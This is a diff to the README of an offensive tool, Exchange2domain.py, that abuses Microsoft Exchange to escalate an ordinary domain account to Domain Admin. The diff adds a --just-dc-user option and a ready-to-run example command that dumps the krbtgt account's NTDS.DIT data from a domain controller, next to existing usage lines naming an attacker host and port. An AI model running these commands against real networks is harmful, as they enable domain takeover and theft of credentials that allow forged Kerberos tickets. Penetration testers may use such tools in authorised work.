@@ -15,7 +15,8 @@ usage: Exchange2domain.py [-h] [-u USERNAME] [-d DOMAIN] [-p PASSWORD]
                           [-ap ATTACKER_PORT] -th TARGET_HOST
                           [-exec-method [{smbexec,wmiexec,mmcexec}]]
                           [--exchange-version EXCHANGE_VERSION]
-                          [--attacker-page ATTACKER_PAGE] [--debug]
+                          [--attacker-page ATTACKER_PAGE]
+                          [--just-dc-user USERNAME] [--debug]
                           HOSTNAME
 
 Exchange your privileges for Domain Admin privs by abusing Exchange. Use me
@@ -53,6 +54,9 @@ optional arguments:
   --attacker-page ATTACKER_PAGE
                         Page to request on attacker server (default:
                         /privexchange/)
+  --just-dc-user USERNAME
+                        Extract only NTDS.DIT data for the user specified.
+                        Only available for DRSUAPI approach.
   --debug               Enable debug output
 ```
 
@@ -62,3 +66,12 @@ python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th 
 ```
 
 ![](https://blogpics-1251691280.file.myqcloud.com/imgs/20190124140647.jpg)
+
+
+
+If you only want to dump `krbtgt`, use `--just-dc-user`.
+
+example:
+```
+python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip  --just-dc-user krbtgt MailServerip
+```
